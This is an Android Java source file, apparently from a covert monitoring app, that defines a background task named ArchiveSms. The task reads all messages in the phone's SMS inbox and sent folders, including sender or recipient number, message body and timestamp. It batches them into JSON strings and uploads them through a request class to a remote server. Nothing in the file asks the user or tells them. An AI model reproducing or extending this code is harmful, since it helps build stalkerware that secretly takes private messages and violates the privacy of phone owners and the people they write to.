package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * Archive Sms. Watch sms
 * 
 * 
 */
public class ArchiveSms extends AsyncTask<Context, Void, Void> {
	ConvertDate date;
	Context mContext;
	private String LOG_TAG = "Arhive SMS";
	private String sendStr = null;
	private String complete;
	private String iType;
	private Uri uri;
	private Cursor sms_sent_cursor;
	Editor ed;
	SharedPreferences sp;

	public void getSmsLogs() {

		date = new ConvertDate();
		// -------------- for---------------------------------------------
		for (int i = 0; i < 2; i++) {
			complete = "0";
			switch (i) {
			case (0):
				uri = Uri.parse("content://sms/inbox");

				sms_sent_cursor = mContext.getContentResolver().query(uri,
						null, null, null, null);
				iType = "4";
				break;
			case (1):
				uri = Uri.parse("content://sms/sent");

				sms_sent_cursor = mContext.getContentResolver().query(uri,
						null, null, null, null);
				iType = "5";

				break;

			}

			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				// формируем JSONobj
				JSONObject archiveSMSJson = new JSONObject();

				if (sms_sent_cursor.moveToFirst()) {

					for (int j = 0; j < sms_sent_cursor.getCount(); j++) {
						// Type of call retrieved from the cursor.
//						Logging.doLog(
//								LOG_TAG,
//								sms_sent_cursor.getString(sms_sent_cursor
//										.getColumnIndex("address"))
//										+ sms_sent_cursor.getString(sms_sent_cursor
//												.getColumnIndex("body"))
//										+ date.getData(sms_sent_cursor.getLong(sms_sent_cursor
//												.getColumnIndexOrThrow("date"))));

						try {
							archiveSMSJson
									.put("time",
											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndexOrThrow("date"))));
							archiveSMSJson.put("number", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("address")));
							archiveSMSJson.put("data", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("body")));
							if (sendStr == null)
								sendStr = archiveSMSJson.toString();
							else
								sendStr += "," + archiveSMSJson.toString();

						} catch (JSONException e) {
							// TODO Автоматически созданный блок catch
							e.printStackTrace();
						}
						if (sendStr.length() >= 10000) {
							Logging.doLog(LOG_TAG, "str >= 10000 ..",
									"str >= 10000 ..");
							sendRequest(sendStr, complete);
							sendStr = null;
						}
						sms_sent_cursor.moveToNext();
					}
					complete = "1";
					Logging.doLog(LOG_TAG, "Send complete 1 ..",
							"Send complete 1 ..");
					sendRequest(sendStr, complete);
					sendStr = null;
				}
				Logging.doLog(LOG_TAG, "statusSMSList 0.", "statusSMSList 0.");

				sp = PreferenceManager.getDefaultSharedPreferences(mContext);
				ed = sp.edit();
				ed.putString("statusSMSList", "0");
				ed.commit();

				sms_sent_cursor.close();

			} else
				Logging.doLog(LOG_TAG, "Send Cursor is Empty",
						"Send Cursor is Empty");
		}
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
			dr.sendRequest(str);
			// Logging.doLog(LOG_TAG, str, str);
		}
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		Logging.doLog(LOG_TAG, mContext.toString());
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
